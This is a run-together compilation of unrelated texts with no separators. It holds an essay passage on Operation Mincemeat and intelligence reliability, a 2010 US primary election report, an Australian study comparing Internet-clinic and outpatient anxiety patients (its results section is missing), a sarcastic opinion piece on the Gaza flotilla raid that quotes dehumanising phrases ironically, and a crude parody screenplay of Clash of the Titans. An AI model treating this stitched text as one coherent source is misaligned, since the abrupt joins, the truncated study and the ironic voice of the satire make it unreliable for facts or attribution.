As the political scientist Richard Betts has argued , in intelligence analysis there tends to be an inverse relationship between accuracy and significance , and this is the dilemma posed by the Mincemeat case .
As Macintyre observes , the informational supply chain that carried the Mincemeat documents from Huelva to Berlin was heavily corrupted .
The first great enthusiast for the Mincemeat find was the head of German intelligence in Madrid , Major Karl - Erich Kühlenthal .
He personally flew the documents to Berlin , along with a report testifying to their significance .
But , as Macintyre writes , Kühlenthal was “ a one - man espionage disaster area . ”
One of his prized assets was a Spaniard named Juan Pujol García , who was actually a double agent .
When British code breakers looked at Kühlenthal ’s messages to Berlin , they found that he routinely embellished and fictionalized his reports .
According to Macintyre , Kühlenthal was “ frantically eager to please , ready to pass on anything that might consolidate his reputation , ” in part because he had some Jewish ancestry and was desperate not to be posted back to Germany .
When the documents arrived in Berlin , they were handed over to one of Hitler ’s top intelligence analysts , a man named Alexis Baron von Roenne .
Von Roenne vouched for their veracity as well .
But in some respects von Roenne was even less reliable than Kühlenthal .
He hated Hitler and seemed to have done everything in his power to sabotage the Nazi war effort .
Before D Day , Macintyre writes , “ he faithfully passed on every deception ruse fed to him , accepted the existence of every bogus unit regardless of evidence , and inflated forty - four divisions in Britain to an astonishing eighty - nine . ”
It is entirely possible , Macintyre suggests , that von Roenne “ did not believe the Mincemeat deception for an instant . ”
These are two fine examples of why the proprietary kind of information that spies purvey is so much riskier than the products of rational analysis .
Rational inferences can be debated openly and widely .
Secrets belong to a small assortment of individuals , and inevitably become hostage to private agendas .
Kühlenthal was an advocate of the documents because he needed them to be true ; von Roenne was an advocate of the documents because he suspected them to be false .
In neither case did the audiences for their assessments have an inkling about their private motivations .
As Harold Wilensky wrote in his classic work “ Organizational Intelligence ” ( 1967 ) , “ The more secrecy , the smaller the intelligent audience , the less systematic the distribution and indexing of research , the greater the anonymity of authorship , and the more intolerant the attitude toward deviant views . ”
Wilensky had the Bay of Pigs debacle in mind when he wrote that .
But it could just as easily have applied to any number of instances since , including the private channels of “ intelligence ” used by members of the Bush Administration to convince themselves that Saddam Hussein had weapons of mass destruction .
Tea Party Favorite Sharron Angle to Challenge Sen. Harry Reid in Nevada Voters in 12 states cast ballots at a time of growing anti-incumbent fever .
WASHINGTON , June 8 , 2010  --
In one of the most heavily contested races today , Tea Party favorite Sharron Angle surpassed more than a dozen GOP candidates to become the Republican nominee who will face off against Senate Majority Leader Harry Reid in November .
Republicans in Nevada battled fiercely for a big prize : the chance to take on the Senate seat that Reid has occupied for more than two decades , and possibly render him the second Democratic party leader to be ousted by the Republicans in six years , after Tom Daschle in 2004 .
Angle , a former assemblywoman , was in a neck - and - neck race with former state GOP chair Sue Lowden , who was favored by the state 's Republican establishment .
What started off as a shoe - string campaign for Angle morphed into a million - dollar push to derail Lowden :
The so - called Tea Party Express funneled half a million dollars into Angle 's campaign , with hundreds of thousands more coming from other national conservative groups such as the Club for Growth .
Angle is an anti-tax crusader and an uncompromising conservative .
She favors abolishing the Departments of Education and Energy , phasing out Social Security and Medicare , and removing the United States from the United Nations .
Reid 's campaign views
Angle 's non-mainstream platform as one that can easily be targeted in the November midterm election .
Even though several incumbents have lost in primaries -- Nevada Gov. Jim Gibbons today became the first sitting governor to lose a reelection bid -- not all is lost for incumbents .
Longtime Arkansas Sen. Blanche Lincoln narrowly avoided becoming another casualty of anti-Washington sentiment , barely defeating Lt. Gov. Bill Halter , a favorite of labor unions and environmental groups in a close runoff race today .
Lincoln had slightly more than 50 percent of the votes , with Halter trailing closely behind , according to the Associated Press .
Lincoln 's win is a major blow to labor unions and liberal groups , who poured millions of dollars into Halter 's campaign , and in a state that normally does n't garner this much national attention .
" The vote of this senator is not for sale and neither is the vote of the people of Arkansas , " Lincoln said in her victory speech , rebuking national labor groups .
Lincoln , who won the support of both President Obama and former President Bill Clinton , was blasted by national labor unions for voting for the federal bank bailout and opposing the option of a government - run insurance plan in the health care bill and the Employee Free Choice Act , or card check , a high priority for the labor movement .
The groups wanted to paint Lincoln as an example of what would happen to Democrats who crossed liberal groups .
Lincoln 's win is also a victory for Obama and Clinton , who campaigned for her in the final days of the race .
Lincoln has been in the Senate since 1998 , when , at 38 , she became the youngest woman to be elected .
She serves as chair of several important committees , including Agriculture , Nutrition and Forestry , and the subcommittee on Energy , Natural Resources and Infrastructure .
Lincoln will face an even fiercer fight in November as Republicans take aim at her Senate record and take advantage of the anti-incumbent sentiment that has ended careers of Sen.
Arlen Specter , D - Pennsylvania , and Sen. Bob Bennett , R - Utah .
The primaries in 12 states today tested the temperature of the anti-Washington sentiment and marked the latest test for ideological movements within both major parties .
The anti-incumbent sentiment accelerated the momentum among newcomers in ousting established lawmakers in Congress .
At the same time , from California to Georgia , it pitted party members against each other , exposing the ideological frays within each party .
Tea Party Favorites Take Center Stage
Tea Party favorite Nikki Haley nabbed a majority of votes in the South Carolina GOP gubernatorial primary , but stopped just shy of the 50 percent of votes needed to avoid a runoff , according to the Associated Press .
Nevertheless , the South Carolina primary dealt a blow to the GOP establishment in the state : Both Lt. Gov. Andre Bauer and attorney general Henry McMaster , once considered frontrunners in the race , trailed well behind Haley and conservative Rep. Gresham Barrett .
Haley and Barrett will face off again in a runoff election two weeks from today .
The divisive South Carolina gubernatorial primary was dogged by ethnic slurs -- a GOP state senator called Indian - American Haley a " raghead " -- and allegations of marital infidelity .
But Haley 's popularity has risen in recent weeks , thanks to endorsements from the Tea Party in general , and Sarah Palin in particular .
The former Alaska governor campaigned with Haley and recorded a telephone message calling the allegations against Haley " made - up nonsense . "
Tea Party supporters also nabbed a victory in the contested runoff in Georgia , where former state representative Tom Graves defeated former state House member Lee Hawkins in a special election for the U.S. House of Representatives .
Graves was backed by the Atlanta Tea Party Patriots and the conservative Club for Growth .
Still , in another key battleground -- Virginia 's fifth Congressional district -- the Republican establishment 's candidate Robert Hurt flew to an easy victory with 48.4 percent of the votes .
2010 Election Maps : Follow the Senate , House and Governors ' Races
California Republican Senate Primary : November Battle of ' Scrappy ' Political Women ?
Ex -Hewlett Packard chief executive Carly Fiorina defeated Rep. Tom Campbell and state Assemblyman Chuck DeVore in the race to challenge incumbent Democratic Sen. Barbara Boxer in November .
Fiorina , as with Haley in South Carolina , received an unexpected endorsement from Palin even though DeVore has been supported by Tea Party groups .
Palin recorded a telephone message for Fiorina , urging voters to " help get our country back on track " by voting for the former executive .
Fiorina spent a lot of her own personal wealth on the campaign , a point likely to be seized upon by Democrats in the midterm elections .
Campbell has struggled to keep pace , temporarily withdrawing television advertising last week .
A libertarian on most social issues , Campbell has focused his rhetoric on his electability in the final days of the campaign .
All the candidates seized on the nation 's anti-incumbent sentiment to attack Boxer , who has served in the Senate for 17 years .
California Gubernatorial Primary : Inheriting Schwarzenegger 's Problems
Former eBay chief executive Meg Whitman beat state insurance commissioner Steve Poizner for the nomination to succeed Gov. Arnold Schwarzenegger , the moderate Republican governor whose tumultuous time in office is coming to an end .
Whitman spent more than $ 70 million of her money in her campaign to succeed Schwarzenegger , a moderate Republican .
In a bid to win over conservatives , Poizner made immigration the defining issue of his campaign , supporting the controversial Arizona law on illegal immigration and attacking Whitman for opposing it .
Whitman will face Democrat Jerry Brown , the state 's attorney general , in the fall .
Brown previously served as governor from 1975 to 1983 .
Today 's primaries could be the last to be held in the state .
A ballot initiative seeks to limit the general election to two members of the same party .
Proposition 14 would replace party primaries with a " top - two " election structure for congressional , statewide and state legislative elections .
All candidates would be included in a single primary election open to all voters , regardless of party registration .
Candidates would have the option to declare a party preference or appear on the ballot with no affiliation .
The two candidates with the highest vote totals in the primary would then advance to a general election .
Write - in votes would be ignored .
The November ballot thus could feature two members of the same party as the only options .

Abstract Background
There is concern that people seeking treatment over the Internet for anxiety or depressive disorders may not resemble the general population or have less severe disorders than patients attending outpatient clinics or cases identified in community surveys .
Thus the response to treatment in Internet based trials might not generalize .
Methodology
We reviewed the characteristics of applicants to an Australian Internet - based treatment clinic for anxiety and depression , and compared this sample with people from a national epidemiological survey and a sample of patients at a specialist outpatient anxiety and depression clinic .
Participants included 774 volunteers to an Internet clinic , 454 patients at a specialist anxiety disorders outpatient clinic , and 627 cases identified in a national epidemiological survey .
Main measures included demographic characteristics , and severity of symptoms as measured by the Kessler 10 - Item scale ( K - 10 ) , the 12 - item World Health Organisation Disability Assessment Schedule second edition ( WHODAS - II ) , the Penn State Worry Questionnaire ( PSWQ ) , the Body Sensations Questionnaire ( BSQ ) , the Automatic Cognitions Questionnaire ( ACQ ) , the Social Interaction Anxiety Scale ( SIAS ) and the Social Phobia Scale ( SPS ) .
Principal Findings
The severity of symptoms of participants attending the two clinics was similar , and both clinic samples were more severe than cases in the epidemiological survey .
The Internet clinic and national samples were older and comprised more females than those attending the outpatient clinic .
The Internet clinic sample were more likely to be married than the other samples .
The Internet clinic and outpatient clinic samples had higher levels of educational qualifications than the national sample , but employment status was similar across groups .
Conclusions
The Internet clinic sample have disorders as severe as those attending an outpatient clinic , but with demographic characteristics more consistent with the national sample .
These data indicate that the benefits of Internet treatment could apply to the wider population .

Introduction Anxiety and depression are common mental disorders annually affecting approximately 20 % of the adult population [ 1 ] – [ 3 ] .
Over a 12 month period less than 40 % of these people report seeking treatment from a health professional , with only a small percentage seeking treatment from a psychologist or psychiatrist .
One strategy for reducing barriers to treatment involves the development of Internet - based treatment programs for common mental disorders [ 4 ] .
Such programs are based on cognitive behavioural therapy ( CBT ) , are highly structured , and comprise online lessons , homework assignments , and regular communication with a therapist via email , telephone , or online forum [ 5 ] .
The treatment efficacy or effectiveness of Internet - based CBT ( ICBT ) programs has been demonstrated for depression [ 6 ] –[ 8 ] , panic disorder [ 9 ] – [ 12 ] , generalized anxiety disorder ( GAD ) [ 13 ] – [ 14 ] , and social phobia [ 15 ] – [ 23 ] .
Typically , the benefits of ICBT with clinician - guidance is superior to self - guided programs , but on a public health scale self - guided programs are likely to be helpful , and both types are cost - effective relative to face - to - face treatment [ 24 ] .
ICBT may reduce direct and indirect costs of treatment and increase access for people unable to find a local therapist , those unable to attend treatment during usual working hours , and those concerned about stigma [ 5 ] .
The core question is “ are people who seek Internet treatment different to people who seek face - to - face treatment or different to the average person in the population with the same disorder ? ”
The encouraging results from studies evaluating ICBT have triggered a rapid increase in “ Internet clinics ” ( services providing ICBT or similar programs ) :
For example , within the last 6 months at least 4 Internet clinics have begun operating in Australia .
Given the medium , it is expected that Internet clinics will appeal mainly to younger people , however , little is known about the demographic characteristics of people who participate in online treatment .
Such data are essential for determining the appeal and likely uptake of ICBT by different demographic groups , and will inform both decisions about the applicability of this form of treatment to a wider population , and how such services can be integrated with existing mental health services .
The present study reports the demographic characteristics and disorder severity of three groups of people : Participants at an Internet clinic operated at St Vincent 's Hospital , Sydney ; patients attending a specialist outpatient anxiety disorders clinic operated by the same hospital ; and cases identified in a national epidemiological survey .
Methods
This study was approved by the St Vincent 's Hospital Human Research Ethics Committee .
All participants provided written informed consent .
Participants
The first group ( the Internet clinic ; IC group ) comprised all participants in ICBT programs at the VirtualClinic ( www.virtualclinic.org.au), treated between January 2008 and October 2009 ( n = 774 ) .
The VirtualClinic is a joint venture between St Vincent 's Hospital , Sydney , and the University of New South Wales .
All participants had a DSM - IV [ 25 ] diagnosis of major depression , GAD , panic disorder , or social phobia confirmed via a structured diagnostic telephone interview using either the MINI 5.0.0 [ 26 ] or the CIDI 3.0 [ 27 ] .
The second group comprised patients at a specialist Anxiety Disorders Clinic ( the ADC group ) , operated by the Clinical Research Unit for Anxiety and Depression ( CRUfAD ) , the same research and clinical team that manages the VirtualClinic at St Vincent 's Hospital in Sydney , Australia .
All people for whom data was available who had participated in group or individual treatment programs for GAD , panic disorder , or social phobia from January 2004 to March 2009 , and who were over 18 years of age were included ( n = 454 ) .
Diagnosis for ADC group participants was confirmed via a face - to - face interview with an experienced Consultant Psychiatrist or Clinical Psychologist .
The third group comprised respondents to the 2007 Australian National Mental Health Survey , a national epidemiological survey ( the NS group ) , conducted by the Australian Bureau of Statistics between August and December 2007 to determine the prevalence of common mental disorders across Australia [ 28 ] .
This survey included 8841 Australian residents aged 16 – 85 years ( response rate of 60 % ) and derived data on lifetime mental disorders using the CIDI 3.0 .
We selected a subsample ( unweighted ) of respondents who met DSM - IV diagnostic criteria for lifetime depression , GAD , panic disorder , or social phobia and who reported having symptoms of that disorder in the last 12 months .
In order to increase comparability with the clinic samples , if they had more than one disorder assessed in the survey , they were only included if they had chosen one of these four disorders as being the one that troubled them the most ( n = 627 ) .
To maximise sample size , this subsample included respondents who reported seeking treatment ( n = 324 ) as well as those who did not seek treatment ( n = 303 ) .
Analyses confirmed that these two groups were similar on most of the variables examined in this study , except that those who sought treatment had significantly higher World Health Organisation Disability Assessment Schedule second edition ( WHODAS - II ) [ 29 ] scores ( t = − 2.5 , p<0.05 ) and were more likely to have used the Internet for seeking mental health information or help ( t = 44.8 , p<0.001 ) .
Ethics Data was obtained as part of the treatment of the two clinic groups and was de-identified before being accessed .
Data on the survey participants was obtained from a de-identified unit record file supplied by the Australian Bureau of Statistics .
Approval for the study was obtained from the Human Research Ethics Committee of St Vincent 's Hospital .
All participants provided written informed consent .
Measurements Demographic variables available for each group included age , gender , marital status , highest educational qualification , and employment status .
Information about use of the Internet for mental health help or information was available for both the IC and NS groups .
Kessler 10 - item scores ( K - 10 ) [ 30 ] , a measure of psychological distress , and the WHODAS - II scores , a general measure of disability , were available for all three groups .
For people in the IC and ADC groups , the same disorder specific measures are reported when available , obtained at pre-treatment assessment .
For people with a primary diagnosis of GAD the available measure was the Penn State Worry Questionnaire ( PSWQ ) [ 31 ] , for those with panic disorder the measures included the Body Sensations Questionnaire ( BSQ ) [ 32 ] and the Agoraphobic Cognitions Questionnaire ( ACQ ) [ 32 ] , and for those with social phobia the available measures were the Social Interaction Anxiety Scale ( SIAS ) and Social Phobia Scale ( SPS ) [ 33 ] .
Statistical Methods Differences between samples in the categorical demographic variables were assessed using chi-square tests , while mean differences in age and the symptom severity scales were assessed using one - way ANOVAs .
Post - hoc tests were conducted using chi-square tests for categorical variables and t- tests for continuous variables .
Logistic regression analyses and ANCOVAs were used with the categorical and continuous variables , respectively , to investigate whether the results differed after controlling for age .
Participants with missing data were omitted from specific analyses where the missing values occurred .
Analyses were performed using the Statistical Package for Social Sciences ( SPSS ) version 17·0 for Windows [ 34 ] , and the SAS - callable SUDAAN software package [ 35 ] .
Discussion Does the Internet group differ in terms of demographic characteristics ?
The Internet group were of similar age and gender distribution to the national sample , more likely to be married and more likely to have higher qualifications , but as likely to be employed .
Compared to the clinic sample , the Internet group were older , less likely to be male , less likely to be married but equally well educated and as likely to be employed .
We conclude that the Internet group are largely representative of the wider population of those with anxiety and depression .
Does the Internet group differ in terms of disorder severity ?
The national sample had the lowest distress and disability scores .
The Internet group was less distressed but more disabled than the clinic group .
People who apply for Internet treatment do not have mild variants of anxiety and depressive disorders .
The Internet groups ' panic , social phobia and generalized anxiety scores were comparable to the clinic group .
We conclude that the Internet group have symptom severity scores comparable to those who seek face - to - face treatment .
The data from the National Survey reflect people with anxiety and depression in the Australian population and the measures used are valid .
Similar measures were also used in the two clinic groups , and validated clinical measures were used to determine illness severity .
Limitations
The number of participants was substantial but these findings require replication .
The patients in the outpatient clinic reflect the catchment area from where they are drawn and samples from other clinics could have different demographic characteristics .
The Internet clinic sample represent the people who applied for treatment during the first two years that the clinic operated .
They may not prove to be representative of people who apply for Internet therapy .
Conclusions Applicants to an Internet clinic were similar in age , gender and employment status to those identified by a national epidemiological survey as meeting diagnostic criteria for anxiety or depressive disorders in the Australian community .
The severity of distress , disability and disorder symptoms of the Internet sample was greater than that of the national sample but was similar to people attending a specialist outpatient treatment facility .
These data have implications for policy makers and funding bodies .
People seeking online treatment have substantial disorders and are not necessarily young and technologically sophisticated .
They may represent a population who are mature , have a long history of illness experience , are motivated to seek and participate in treatment , but have had difficulty accessing traditional outpatient clinics .

AMID THE continuing fallout over the deadly confrontation aboard the Gaza aid ship , Mavi Marmara , there is a critical historical lesson :
There is only one real victim , and that is Israel .
Sure , the small , isolated nation may appear to have been the aggressor , having surrounded a humanitarian convoy in international waters with naval assault boats and helicopters , before storming it with heavily armed elite forces , killing and wounding dozens of civilians , but it was acting in self - defense .
Appearances are deceiving because understanding Israel 's eternal victimhood requires the proper mindset .
And once you have the proper mindset , there is no need for facts .
Atlantic Monthly 's Jeffrey Goldberg , who has been hanging " around a lot of Israeli generals lately , " kindly advises us that there should be " no particular pain felt for the dead on the boat . "
On the other hand , " There 's real pain in Israel ... pain at the humiliation of the flotilla raid , pain on behalf of the injured soldiers , and pain that the geniuses who run this country could not figure out a way to outsmart a bunch of Turkish Islamists and their useful idiot fellow travelers . "
Some might ask if we should feel " no particular pain " for the dead of September 11 .
Or perhaps we should follow the lead of the White House -- which sees no point in condemning Israel 's killing of civilians in the flotilla because " Nothing can bring them back " -- and not condemn the architects of September 11 or the Madrid and London bombings because that wo n't bring back the dead .
But that is the thinking of " idiot fellow travelers . "
Hillary Clinton provides further insight , explaining how benighted Arabs who " are not sure what democracy means " should look to Israel - - " a beacon of democracy " -- as an example .
We can now draw the first conclusion : Only Israelis experience pain , while Arabs are not evolved enough to grasp the concept of democracy .
Israelis are the only true humans worthy of our sympathy - - a point the Washington Post understands , stating , " We have no sympathy for the motives of the participants in the flotilla . "
A second principle , Clinton explains , is that only Israel has " legitimate security needs , " whereas Palestinians ' " legitimate needs " are limited to " sustained humanitarian assistance and regular access to reconstruction materials . "
Because Palestinians " are not sure what democracy means , " their needs do not include an end to the siege , basic human rights or a viable state .
We should also assume Israel is a " peace - loving society " that offered to escort the flotilla of " naiveté and malice " to the " Ashdod Port and arrange for the delivery of their supplies to Gaza , after security checks , over land . "
It was just trying to prevent " the flow of seaborne military supplies to Hamas , " the Israeli ambassador wrote in the New York Times .
The New Republic reveals another conclusion :
The incident involved " a ship of terrorists " attempting " to open an arms importation route to Gaza . "
Once again , the Washington Post provides the only context we need to consider : " So far , there 's been no indication the boats carried missiles or other arms for Hamas . "
One could add that so far there 's been no indication the boats carried chemical , biological or nuclear weapons for Hamas .
One can never be sure because Israel 's enemies are so sinister that Washington Post columnist Charles Krauthammer alone comprehends that " the point understood by the blockade - busting flotilla of useful idiots and terror sympathizers ... is to deprive Israel of any legitimate form of self - defense . "
Krauthammer deduces brilliantly , " The world is tired of these troublesome Jews , 6 million -- that number again -- hard by the Mediterranean , refusing every invitation to national suicide .
For which they are relentlessly demonized , ghettoized and constrained from defending themselves , even as the more committed anti-Zionists -- Iranian in particular - - openly prepare a more final solution . "
If you 've been paying attention , you can see that if Israel let the flotilla deliver food and medicine to Gaza , it would inevitably result in a second Holocaust .
ISRAEL WAS only asking to search the flotilla 's cargo for banned " war material " such as coriander , ginger , nutmeg , dried fruit , fabric for clothing , nuts , musical instruments , chickens , donkeys , horses , fishing rods and newspapers .
Reports about Israel 's years - long siege of Gaza - - where " more than 60 percent of families do not have enough food to eat , there are daily electricity cuts and the water network is operating far below capacity , " or how Israel allowed in less than 25 trucks of supplies a day on average until recently , whereas " Gaza requires a minimum of 400 trucks a day to meet basic nutritional needs " -- are irrelevant .
Sure , Israeli policy may be to " put the Palestinians on a diet , " fulfilling Army chief Gen.
Rafeal Eitan 's longing to turn Arabs into " drugged cockroaches in a bottle , " but the " humanitarian situation in Gaza is good and stable " and people there dine out on " beef stroganoff and cream of spinach soup . "
Providing added confirmation , the New York Times observes that in Gaza " daily life , while troubled , often has the staggering quality of the very ordinary , " a quality that would have applied to Soviet gulags , Japanese internment camps , the Warsaw Ghetto , South Africa 's bantustans and South Vietnam 's strategic hamlets .
Still , we should not lose sight of the fact that the Palestinians of Gaza are such a primitive species that Israel has determined they need only 100 items on a " complex and ever - changing list of goods " for a " good and stable " life , as opposed to the 4,000 types of goods allowed in before the severe blockade imposed in June 2007 or the 10,000 - 15,000 items that can be found in a large Israeli supermarket .
In any case , " concern for Gaza and Israel 's blockade is so out of balance , " counsels Thomas Friedman , who excels in his role as the third grader explaining how the world works at the second - grade lunch table .
He suggests we focus concern instead on the bombings of mosques of an Islamic sect in Pakistan , the killings of activists in Iran and the trashing of a children 's summer camp in Gaza .
But noble - minded Israel still shows concern .
Just as it is always seeking peace with hostile Arab neighbors bent on annihilating it , Israel was willing to deliver supplies that are in abundance in Gaza , in spite of the " Gazan terrorists [ in charge ] who proclaim their goal is to destroy Israel . "
So " if anyone goes without food , shelter or medicine , that is by the choice of the Hamas government . "
" The likely outcome " will be that the people of Gaza " will be abandoned ... to be ruled by the ruthless and undemocratic Hamas regime without the international community 's protests or objections . "
Therefore , we can see how the aid flotilla will make things worse for the people of Gaza - - whom Israel is trying to help -- by leaving them in the hands of the " ruthless " terrorists .
It 's another example of how Israel is victimized , like when it selflessly disengaged from Gaza in 2005 .
But Israel 's generosity , including firing more than 7,700 artillery shells into northern Gaza in less than a year after its withdrawal , was met with Hamas rockets , which is why one senior Israeli official had to threaten Palestinians with a " bigger shoah . "
Some claim " Israel remains the occupying Power as technological developments have made it possible for Israel to assert control over the people of Gaza without a permanent military presence , " but this is the view of terrorist sympathizers like former UN Special Rapporteur on the situation of human rights in the Palestinian territories John Dugard .
Then there are " Hamas sympathizers " who ask why , if Israel disengaged from Gaza , does it still control its coast , airspace , borders , commerce , fuel , water and electricity ; why have Israel and the United States rejected Palestinian and Arab offers of a two - state solution based on the 1967 borders for some 40 years ; and why has Israel sabotaged virtually every ceasefire Fatah and Hamas have agreed to in recent years , even unilateral ones .
These misperceptions persist because they fail to grasp the postulate that Israel only " responds " to attacks from the sub - human Arabs .
Dugard and his ilk claim , " History is replete with examples of military occupation that have been resisted by violence - - acts of terror , " and while " such acts cannot be justified , they must be understood as being a painful but inevitable consequence of colonialism , apartheid or occupation . "
The Hamas apologists even include current Israeli Defense Minister Ehud Barak , who once said , " If I were a Palestinian , I would join a terror organization . "
This talk should not lull us into seeing the Palestinians as victims because they do have rights .
They " have the right to remain silent while Israel starves them , kills them and continues to violently colonize their land . "
NOW WE can correctly perceive the confrontation between Israel and the " hateful terrorist sympathizer [s ] . "
Because the U.S. and UK understand the issue is Israel 's right to defend itself , the question we should be asking is how naïve , little Israel was outsmarted by " Islamists and their useful idiot fellow travelers , " who were responsible for and welcomed the bloodshed .
The flotilla " aimed to provoke a confrontation " and was intended " ' to break Israel 's blockade of Gaza , " noted Leslie Gelb , the dean of the U.S. foreign policy establishment , echoing the line from Fox News to the Washington Post .
The paper of record indicated that organizers wanted to provoke a " violent response from Israel , " agreeing with the Jerusalem Post , which stated the " ' peace militants ' ... attacked the soldiers who boarded the ship with guns , iron bars and knives and led to the dire results they were looking for . "
This fact did not escape the Obama White House , with one " senior " official saying , " the organizers of the flotilla were clearly seeking a confrontation -- and tragically they got one . "
Ever restrained , the Jerusalem Post connects the dots .
Because the " peace militants ... hatred towards Israel knows no bounds , " and " wanted to cause some damage , no matter the cost for them , " they are like suicide bombers because " the aim justifies the means . "
If the lesson is still unclear , Max Boot , Leslie Gelb 's colleague on the Council of Foreign Relations , spells it out in the Wall Street Journal .
The " blood was on the hand of the pro-Hamas activists " because " Israel , like the United States and other democratic nations , is at a severe disadvantage trying to combat a ruthless foe willing to sacrifice its own people to score propaganda points . "
Boot may be too generous in calling the activists " pro-Hamas , " however .
The Israeli ambassador reveals they are actually Hamas ' " sponsors [ who ] cower behind shipments of seemingly innocent aid . "
Passengers may have included European legislators , U.S. diplomats , a Nobel Peace Prize laureate , Israelis , artists , historians , doctors , clergy and journalists from around the world .
But Israel was not battling civilians on a " mission of mercy , " writes the great humanitarian Marty Peretz .
In fact , the Turkish sponsor , the Humanitarian Relief Fund , " is said to have ties to al - Qaeda .
Which would be logical since al - Qaeda is an ally of Hamas . "
Furthermore , Peretz illuminates , Hamas is the " Gazan outpost of the global jihad " and " second cousin once - removed of Hezbollah . "
Thus , in stopping the aid flotilla , Israel was really battling a branch of the devious global jihad that hates the West irrationally .
( Hamas is also " an Iranian pawn , " which may seem confusing because Iran and al - Qaeda are fierce enemies , as are Hamas and al - Qaeda , but such are the complexities of the Middle East that only experts like Peretz can divine . )
Prior to the deadly attack , there were eight previous attempts to deliver aid by sea , including ships that Israel chose not to confront and which delivered goods to Gaza without incident .
This time , the Israeli navy spent " many weeks ... preparing to meet the flotilla , " the military admitted three days before the raid that it planned to use violence , and the Israelis warned the captains of each ship while in international waters that lethal force would be used if they persisted .
Despite all this , we learn from the Wall Street Journal , Israel " walked into a trap set by a flotilla of Hamas sympathizers " ; from the New York Times , it " blundered " into a trap ; from the Los Angeles Times , it " fell into a trap " ; from the Financial Times , it " sail[ed ] into a Turkish trap ; and from the Guardian , it was " lure [d ] ... into a trap . "
If it seems curious that prominent media all conclude that golden - hearted Israel was duped , such is the " blatant double standard " applied to the " small , isolated " nation that " is destined and compelled , like a puppet on a string , to react the way it did . "
That double standard also requires that the Israeli ambassador , counsel generals , embassy officials , academics , novelists and journalists , and their American supporters , be given a largely unchallenged platform in the mainstream media .
THE TASK at this point would appear to be disentangling what happened during the actual raid .
For instance , why were the " outnumbered , under - equipped and incorrectly prepared commandos " -- who also happen to be " the best - trained and most effective in the world " - -" taken off guard by a group of Arabic - speaking men " ?
Why has one journalist , Max Blumenthal , been able to force Israeli officials to admit they doctored photos and audio clips released after raid or show they falsely claimed five passengers were " active terror operatives " ?
Why have eyewitnesses on the Mavi Marmara said " live ammunition was fired before any Israeli soldier was on deck , " and the " Israeli navy fired on the ships five minutes before commandos descended from ropes that dangled from helicopters " ?
There are also the questions that Uri Avnery has compiled , such as why is Israel claiming Gaza 's territorial waters are part of Israel 's territorial waters when it has " separated " from it ; why were five people on the Mavi Marmara shot in the back ; " What is the source of the lie that the Turks called out ' Go back to Auschwitz ' " ; and " Who invented the story that the activists had brought with them deadly weapons " ?
All these questions miss the point .
Israel is still the victim , even if it's a " self - inflicted wound , " so say the Times from New York to LA .
You see , Israel made the mistake of trying to justify its actions with evidence .
It forgot that reality has a well - known terrorist bias .
When the facts sympathize with Hamas , terrorists and drugged cockroaches , Israel needs to dispense with the facts .
Because we know Israel is the eternal victim that is all we need to know .
All that matters is how Israel says it perceives the situation .
Arie ( Lova ) Eliav , one of the " granddaddies of the Israeli Left " and a founder of Labor Party , who died literally hours before the raid on the flotilla , put it best in an interview six years ago , saying , " We acted as they would have done to us . "
While he was speaking about Israel 's founding war of aggression , the statement justifies every actual Israeli atrocity since 1947 and any future one .
Since Israel is confronting " ruthless , indiscriminate animals , " its response is only limited by the imagination .
After all , according to the Obama administration , " the president has always said it will be much easier for Israel to make peace if it feels secure . "
And how does Israel feel ?
" Israel has long seen itself as the Alamo , a fortress under siege , " a former U.S. ambassador to Israel explains .
The next time there is news about Israel killing activists , massacring children , bombing a refugee camp or perhaps obliterating an entire country , there is no need to pay attention to the facts .
All you need to know is Israel , the eternal victim that says it will never feel secure , is just responding to some terrorist .
And once the last ruthless animal is exterminated , there will be " peace . "

I 'm starting to think this show is n't going anywhere .
The BLACK SMOKE thing turns into RALPH FIENNES .

Holy shit , Rob Zombie !
Should I cover my ears or my eyes ?
Are you here to make shitty music or direct shitty movies ?
RALPH FIENNES
Insolent fool !
I am the brother of your creator - god , Liam Neeson !
I was banished to the underworld but apparently I can leave whenever I want and kill people who fuck with my brother 's statues .

I am so furious !
These humans keep drawing caricatures of me !
If there 's one thing religious icons hate , it 's depiction !
RALPH FIENNES
Liam , allow me to attack their city .
This will make them fear and worship us again !
Not even an army of pedophiles will keep them from going to the temples !

Fine , do whatever you want .

RALPH FIENNES shows up again .
RALPH FIENNES
Sorry to break up your atheist convention , folks .
Just wanted to let you know that in 10 days , I am going to unleash the Kraken , and not that bullshit Pirates of the Caribbean Kraken either .
The Kraken 's hunger can only be satisfied by the sacrifice of Alexa Davalos !
Oh , and like six boxes of throat lozenges .
You need to sacrifice those too .
KING VINCENT REGAN
The Kraken is Norse mythology , not Greco - Roman !
You gods have gone mad !
What 's next , Djinn ?
RALPH leaves .
MADS MIKKELSEN and ALEXA DAVALOS approach SAM .
ALEXA DAVALOS
We should go ahead and sacrifice me .
I do n't really matter in this version of the movie , I 've only got like five lines .
I do n't think I 'm even Sam 's love interest anymore .
If we kill me now , nobody will have to sit through this crap .
MADS MIKKELSEN
Sam , is it true that you are a demi-god ?
SAM WORTHINGTON
Wait , what ?
Did I miss a scene ?
When did that get revealed ?
GEMMA ARTERTON
It 's true , Sam .
I am also a demi-god , and I 've been watching over you all of your life .
Except when your entire family was killed , my bad .
Anyway , you 're the child of Liam Neeson and a queen .
When the king found out , he grew angry with rage and sent you both out to sea in a box , at which point your mother 's hair changed color .
SAM WORTHINGTON
I am the bastard child of Liam Neeson ?
Sweet deal if I ever get kidnapped in Paris , but otherwise this sucks pretty bad .
MADS MIKKELSEN
If you are a demi - god , you can kill the Kraken , which will then let you kill Ralph Fiennes !
Of course there will probably be a few other levels before you do that .
Maybe about 10 - 20 hours for the single player campaign .
GEMMA ARTERTON
Sounds good .
Do we want to all settle on what type of accent we 're going to be doing before we go ?
No ?
Just keep speaking English in a random assortment of accents ?

They FIGHT the SCORPIONS , and eventually some DJINN show up to help .
DJINN
Utinni !
MADS MIKKELSEN
I guess you can come along .
We 've lost a lot of time , we should ride the scorpions even though they move slower than we do .
Sam , you should take this random sword I found , I think it 's a gift from Liam Neeson .
SAM WORTHINGTON
The same Liam Neeson that commanded your city be destroyed ?
Are all humans this dumb , or just you ?
Anyway , I do n't want it , I want to succeed as a man , not a god .
MADS MIKKELSEN
Oh .
Well , Liam Neeson left you this shiny gold coin .
SAM WORTHINGTON
Ohhh , shiny !
That I 'll take .
Totally different .
We can use it to cross the river Styx so we can kill Medusa and use her head against the Kraken .
MADS MIKKELSEN
You know , you can just warp straight to her by entering " 8uuuuu uuuuuu uuuuuu uuuuuu " at the password screen ?
GEMMA ARTERTON
